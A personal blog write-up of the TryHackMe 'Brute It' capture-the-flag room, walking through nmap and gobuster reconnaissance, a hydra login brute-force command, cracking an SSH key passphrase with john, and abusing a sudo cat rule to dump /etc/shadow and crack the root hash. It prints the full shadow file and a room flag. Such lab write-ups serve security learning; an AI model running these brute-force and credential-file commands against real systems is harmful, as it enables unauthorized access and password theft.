+++
date = '2026-01-31T19:18:22+07:00'
draft = false
title = 'Brute It CTF Try Hack Me'
+++

Welcome to my first writeup! Today we will solve the Brute It CTF in Try Hack Me!

First, lets go find some information on target's system with a nmap scan

```
┌─[✗]─[woahuh@parrot]─[~]
└──╼ $nmap -sV -Pn -A 10.48.188.61
```

And then, we got this output

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 06:19 +07
Nmap scan report for 10.48.188.61 (10.48.188.61)
Host is up (0.098s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.85 seconds
```

As the output, we have 2 ports open, and thats the answer of question 1

We also can see that ssh is running on **OpenSSH 7.6p1**. And that is the answer for question 2

When we take a closer look at port 80, we can see that it running Apache server and Apache is running on version **2.4.29**

And thats the answer of question 3

Next to Apache version is the os it is running on, we can clearly see that it is **Ubuntu**. This is the answer of question 4

With the question 5, i used gobuster to brute force the directory

```
┌─[✗]─[woahuh@parrot]─[~]
└──╼ $gobuster dir -u http://10.48.188.61/ -w /usr/share/wordlists/rockyou.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.188.61/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/rockyou.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 5347 / 14344393 (0.04%)[ERROR] parse "http://10.48.188.61/!@#$%^": invalid URL escape "%^"
/*****                (Status: 301) [Size: 312] [--> http://10.48.188.61/*****/]
Progress: 23190 / 14344393 (0.16%)[ERROR] parse "http://10.48.188.61/!\"£$%^": invalid URL escape "%^"
Progress: 25015 / 14344393 (0.17%)[ERROR] parse "http://10.48.188.61/!@#$%^&*()": invalid URL escape "%^&"
Progress: 27608 / 14344393 (0.19%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 27612 / 14344393 (0.19%)
===============================================================
Finished
===============================================================
```

Lets go! We found the hidden directory, It is **/admin**. Now we can answer the last question in task 2

Now, we have to brute force the password for website but lets see what is the username

Yay,the username is inside source code

![Source code](/images/brute-it/source-code-bruteit.webp)

Lets use hydra to crack the password

```
hydra -l username-we-found -P /usr/share/wordlists/rockyou.txt 10.48.188.61 http-post-form '/path-we-found/:user=^USER^&pass=^PASS^:f = invalid' -V
```

i never cracked the password but i think you can !

So the answer for the first question in task 3 is **admin:xavier**

After login, we have the web flag for question 4 in task 3

![The flag](/images/brute-it/flag-img-bruteit.webp)

This is a rsa key, we have to crack it

![RSA key](/images/brute-it/rsa-key-bruteit.webp)

Lets use ssh2john to turn this key to hash

```
┌─[✗]─[woahuh@parrot]─[~]
└──╼ $/usr/share/john/ssh2john.py key.txt
```

After we got the hash (It is too long so i wont put it on here), we gonna use john to crack it

```
┌─[woahuh@parrot]─[~]
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt key.txt
```

Lets go, we got the password

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**********       (?)
1g 0:00:00:00 DONE (2026-02-01 07:22) 14.28g/s 1038Kp/s 1038Kc/s 1038KC/s saloni..punyaku
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

This is the answer for question 2

Now, we have to ssh in target's machine for user flag

```
┌─[✗]─[woahuh@parrot]─[~]
└──╼ $chmod 600 rsakey.txt
```

Make sure the password file have permisson

```
┌─[woahuh@parrot]─[~]
└──╼ $ssh -i rsakey.txt john@10.48.188.61
```

ssh to target's system

```
Enter passphrase for key 'rsakey.txt':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage

System information as of Sun Feb  1 00:40:10 UTC 2026

System load:  0.0                Processes:           109
Usage of /:   25.7% of 19.56GB   Users logged in:     0
Memory usage: 43%                IP address for ens5: 10.48.188.61
Swap usage:   0%


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$
```

We got the user flag now! Lets answer the question 3 in task 3 with the flag

```
john@bruteit:~$ ls
user.txt
john@bruteit:~$ cat user.txt
THM{a_password_is_not_a_barrier}
john@bruteit:~$
```

Lets get root permisson now

```
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
(root) NOPASSWD: /bin/cat
```

As the output of ⁨`sudo -l`⁩, we can use cat as as root without password

After running the cat command for /etc/shadow, we got the root hash, lets crack it

```
john@bruteit:~$ sudo cat /etc/shadow
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::
```

After use john to crack the hash, we got the root password now!

```
┌─[woahuh@parrot]─[~]
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
********         (?)
1g 0:00:00:00 DONE (2026-02-01 17:25) 3.448g/s 5296p/s 5296c/s 5296C/s 123456..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

This is also the answer for question 1 task 4

And for the last flag, here we go!

```
root@bruteit:~# ls
root.txt
root@bruteit:~# cat root.txt
THM{****************}
```

Thats also the finish of this room and writeup, thanks you for reading my writeup!
